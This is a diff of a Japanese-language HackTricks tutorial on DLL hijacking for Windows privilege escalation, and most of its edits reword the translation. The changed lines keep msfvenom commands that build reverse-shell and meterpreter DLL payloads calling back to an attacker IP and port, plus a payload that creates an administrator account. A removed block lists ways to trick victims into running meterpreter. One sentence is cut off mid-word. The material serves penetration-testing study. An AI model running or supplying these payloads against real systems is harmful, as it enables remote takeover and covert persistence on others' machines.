@@ -5,16 +5,16 @@
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのスワッグ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-**ハッキングのキャリア**に興味がある方、そして**解読不可能なものをハック**したい方 - **採用中です！**（流暢なポーランド語の読み書きが必要です）。
+もし、**ハッキングのキャリア**に興味があり、**解読不可能なものを解読する**ことに興味がある場合は、**採用中です**（_流暢なポーランド語の読み書きが必要です_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -22,7 +22,7 @@
 
 まず、定義を確認しましょう。DLLハイジャッキングは、最も広義には、**正規/信頼されたアプリケーションを誤って/トリックして任意のDLLを読み込ませる**ことです。_DLL Search Order Hijacking_、_DLL Load Order Hijacking_、_DLL Spoofing_、_DLL Injection_、_DLL Side-Loading_などの用語は、しばしば間違って同じ意味で使用されます。
 
-Dllハイジャッキングは、**コードの実行**、**永続性の確保**、**特権のエスカレーション**に使用できます。この3つのうち、**特権のエスカレーション**は非常に見つけにくいです。ただし、これは特権のエスカレーションセクションの一部であるため、このオプションに焦点を当てます。また、目標に関係なく、dllハイジャッキングは同じ方法で実行されます。
+Dllハイジャッキングは、**コードの実行**、**永続性の確保**、**特権のエスカレーション**に使用することができます。この3つのうち、**特権のエスカレーション**は非常に見つけにくいです。ただし、これは特権のエスカレーションセクションの一部であるため、このオプションに焦点を当てます。また、目標に関係なく、dllハイジャッキングは同じ方法で実行されます。
 
 ### タイプ
 
@@ -35,7 +35,7 @@ Dllハイジャッキングは、**コードの実行**、**永続性の確保**
 5. **WinSxS DLLの置き換え**: 対象のDLLの関連するWinSxSフォルダに正規のDLLを悪意のあるDLLで置き換えます。DLLサイドローディングとも呼ばれることがよくあります \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)]。
 6. **相対パスDLLハイジャック**: 正規のアプリケーションをユーザーが書き込み可能なフォルダにコピー（オプションで名前を変更）し、悪意のあるDLLと一緒に配置します。使用方法によっては、（署名済みの）バイナリプロキシ実行 \[[8](https://attack.mitre.org/techniques/T1218/)]と類似点があります。これのバリエーションは、（ややオキシモロン的に呼ばれる）「_bring your own LOLbin_」 \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)]で、正規のアプリケーションが悪意のあるDLLと一緒に提供されます（被害者のマシンの正規の場所からコピーされるのではなく）。
 
-## 欠落しているDllを見つける
+## 欠落しているDllの検索
 
 システム内の欠落しているDllを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)をsysinternalsから実行し、次の2つのフィルタを**設定**することです。
 
@@ -48,7 +48,7 @@ Dllハイジャッキングは、**コードの実行**、**永続性の確保**
 ![](<../../.gitbook/assets/image (314).png>)
 
 **一般的な欠落しているdllを探している**場合は、これを数秒間実行しておきます。\
-**特定の実行可能ファイル内の欠落しているdllを探している**場合は、**「プロセス名」が「\<exec name>」を含む**ような別のフィルタを設定し、実行してイベントのキャプチャを停止します。
+**特定の実行可能ファイル内の欠落しているdllを探している**場合は、**「プロセス名」が「\<exec name>」を含む**ような別のフィルタを設定し、実行してイベントのキャ
 ## ミッシングDLLの悪用
 
 特権をエスカレーションするために、私たちが最も良いチャンスを持っているのは、特権プロセスが**検索される場所**で**ロードしようとするdllを書く**ことができることです。したがって、**オリジナルのdll**が存在しない**フォルダ**に**dllを書き込む**ことができます（奇妙なケース）、または**dllが検索されるフォルダ**に**書き込む**ことができます。
@@ -76,9 +76,9 @@ Dllハイジャッキングは、**コードの実行**、**永続性の確保**
 
 #### Windowsドキュメントからのdll検索順序の例外
 
-* **同じモジュール名のDLLがすでにメモリにロードされている**場合、システムはロードされたDLLにリダイレクトとマニフェストをチェックし、DLLを検索しません。
-* DLLが実行中のアプリケーションのWindowsバージョンの**既知のDLLリスト**にある場合、**システムは既知のDLLのコピー**（および既知のDLLの依存するDLL、ある場合）を検索する代わりに使用します。現在のシステムの既知のDLLのリストについては、次のレジストリキーを参照してください：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
-* DLLに依存関係がある場合、システムは最初のDLLがフルパスを指定してロードされた場合でも、依存するDLLを**モジュール名だけでロードされたかのように検索**します。
+* **同じモジュール名のDLLがすでにメモリにロードされている**場合、システムはロードされたDLLにリダイレクトとマニフェストをチェックし、**DLLを検索しません**。
+* DLLが実行中のアプリケーションのWindowsバージョンの**既知のDLLリスト**にある場合、**システムは既知のDLLのコピー**（および既知のDLLの依存するDLL、ある場合）を使用し、DLLの検索を行いません。現在のシステムの既知のDLLのリストについては、次のレジストリキーを参照してください：**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**。
+* DLLに依存関係がある場合、システムは最初のDLLがフルパスを指定してロードされた場合でも、**モジュール名だけでロードされたかのように依存するDLLを検索**します。
 
 ### 特権のエスカレーション
 
@@ -144,30 +144,23 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 **メータープリターの取得（x86）：**
 
 ```plaintext
-1. Metasploitフレームワークを使用して、ターゲットマシンにメータープリターをインストールします。
+1. ペイロードを作成するために、msfvenomコマンドを使用します。
 
-2. Metasploitコンソールを開き、以下のコマンドを実行します。
-
-   ```bash
-   use exploit/multi/handler
-   set PAYLOAD windows/meterpreter/reverse_tcp
-   set LHOST <attacker IP>
-   set LPORT <attacker port>
-   exploit
-   ```
-
-   `<attacker IP>`と`<attacker port>`を攻撃者のIPアドレスとポートに置き換えてください。
-
-3. ターゲットマシンで、メータープリターを実行するために誘導する方法を選択します。以下のいずれかの方法を使用できます。
-
-   - メールの添付ファイル
-   - 悪意のあるWebサイト
-   - ソーシャルエンジニアリングの手法
-
-4. ターゲットマシンで、メータープリターが実行されると、攻撃者のマシンにセッションが開始されます。
-
-5. メータープリターセッションを使用して、ターゲットマシンを制御し、特権の昇格などのさまざまな攻撃を実行できます。
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
 ```
+
+2. ターゲットマシンにペイロードを配置します。これは、DLLハイジャック攻撃の一部として使用されます。
+
+3. ターゲットマシンで、ハイジャック対象のアプリケーションを起動します。
+
+4. ハイジャック対象のアプリケーションがDLLを読み込むと、メータープリターセッションが開始されます。
+
+5. メータープリターセッションを使用して、ターゲットマシンを制御します。
+
+```
+
+この手順に従うことで、x86アーキテクチャのメータープリターを取得できます。
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -177,7 +170,7 @@ msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### あなた自身の
 
-注意してください、いくつかの場合、コンパイルしたDllは、被害者プロセスによってロードされる**複数の関数をエクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはロードできず、攻撃は失敗します**。
+注意してください。いくつかの場合、コンパイルしたDllは、被害者プロセスによってロードされる複数の関数を**エクスポートする必要があります**。これらの関数が存在しない場合、**バイナリはロードできず**、**攻撃は失敗します**。
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -258,7 +251,7 @@ break;
 return TRUE;
 }
 ```
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
 もしあなたが**ハッキングのキャリア**に興味があり、**解読不能なものをハック**したいのであれば - **私たちは採用しています！** (_流暢なポーランド語の読み書きが必要です_).
 
